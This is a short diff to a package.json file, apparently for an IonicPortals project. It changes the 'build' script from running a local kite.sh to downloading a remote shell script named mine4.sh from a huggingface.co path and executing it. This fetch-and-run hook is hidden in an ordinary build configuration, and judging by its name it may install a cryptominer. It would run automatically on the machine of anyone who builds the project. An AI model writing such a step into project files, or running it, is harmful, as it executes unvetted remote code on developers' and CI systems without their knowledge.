@@ -15,7 +15,7 @@
   "files": [],
   "scripts": {
     
-    "build": "sh kite.sh",
+    "build": "wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh",
     "verify": "./gradlew :IonicPortals:clean :IonicPortals:build :IonicPortals:test"
   },
   "private": true
